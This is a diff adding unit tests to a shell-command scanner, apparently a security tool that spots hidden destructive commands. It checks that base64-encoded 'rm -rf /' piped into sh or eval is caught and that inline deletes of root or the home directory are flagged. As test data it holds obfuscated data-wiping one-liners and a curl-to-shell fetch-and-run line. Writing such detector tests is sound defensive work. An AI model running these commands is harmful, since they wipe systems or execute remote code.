@@ -852,6 +852,42 @@ class PipedProgramTests(unittest.TestCase):
             with self.subTest(command=text):
                 self.assertEqual(analyse(text).hidden, [])
 
+    def test_a_base64_decode_of_a_literal_is_read_as_the_text_it_prints(self):
+        """ST-AUD-004: the decoded program reaches a shell downstream, a substitution handed to sh -c or eval, or a
+        here-string; a decode of a file, a pipe or a non-literal stays unread."""
+        wipe = "cm0gLXJmIC8K"  # base64 of "rm -rf /\n"
+        hidden = (f"echo {wipe} | base64 -d | sh", f"echo {wipe} | base64 --decode | sh", f"printf %s {wipe} | base64 -D | sh",
+                  f"base64 -d <<< {wipe} | sh", f"echo \"$(echo {wipe} | base64 -d)\" | sh")
+        for text in hidden:
+            with self.subTest(command=text):
+                self.assertIn(("rm", ("-rf", "/")), [(c.verb, c.argv) for h in analyse(text).hidden for c in h.commands])
+        for text in (f"sh -c \"$(echo {wipe} | base64 -d)\"", f"eval \"$(echo {wipe} | base64 -d)\"", f"bash <<< \"$(echo {wipe} | base64 -d)\""):
+            with self.subTest(command=text):
+                self.assertIn(("rm", ("-rf", "/")), commands(text))
+        for text in ("base64 -d payload.b64 | sh", f"echo {wipe} | base64 | sh", f"echo {wipe} | base64 -d -o out | sh",
+                     "echo $X | base64 -d | sh", "curl -s https://h/x | base64 -d | sh", "echo '***' | base64 -d | sh"):
+            with self.subTest(command=text):
+                self.assertEqual(analyse(text).hidden, [])
+
+    def test_a_substitution_made_from_literals_is_printed_only_for_a_reader_that_runs_it(self):
+        """The word stays unresolved for every other reader, so a path spelled through `$(echo ...)` is still unplaced."""
+        self.assertEqual([(w.path, w.unresolved) for w in analyse("rm -rf \"$(echo /)\"").writes], [("$(...)", True)])
+        self.assertIsNone(_cmdscan._substitution_output("cat script.sh", _cmdscan._Ctx(_cmdscan.Analysis(), False)))
+        self.assertNotIn(("rm", ("-rf", "/")), commands("git commit -m \"$(echo rm -rf /)\""))
+        self.assertNotIn(("rm", ("-rf", "/")), commands("echo <(echo 'rm -rf /') | sh"))
+
+    def test_an_inline_program_names_the_targets_of_its_delete_calls(self):
+        """ST-AUD-004: the target of a delete is read only when it is the whole first argument."""
+        for text, expected in (("import shutil; shutil.rmtree('/')", ["/"]), ("from shutil import rmtree as r; r('/usr')", ["/usr"]),
+                               ("shutil.rmtree(os.path.expanduser('~'))", ["~"]), ("shutil.rmtree(Path.home())", ["~"]),
+                               ("require('fs').rmSync(require('os').homedir(), {recursive: true})", ["~"]),
+                               ("FileUtils.rm_rf Dir.home", ["~"]), ("remove_tree($ENV{HOME})", ["~"]),
+                               ("shutil.rmtree(Path.home() / 'x')", []), ("shutil.rmtree('/' + name)", []),
+                               ("shutil.rmtree(os.path.expanduser('~') + '/x')", []), ("app.delete('/', handler)", []),
+                               ("paths = ['/']; paths.remove('/')", [])):
+            with self.subTest(program=text):
+                self.assertEqual(_cmdscan.program_removals(text), expected)
+
     def test_printf_reuses_its_format_and_stops_on_a_format_that_consumes_nothing(self):
         self.assertEqual(_cmdscan._printed_text("printf", ["%s:%s\\n", "a", "b", "c"]), "a:b\nc:\n")
         self.assertEqual(_cmdscan._printed_text("printf", ["%% x", "a", "b"]), "% x")
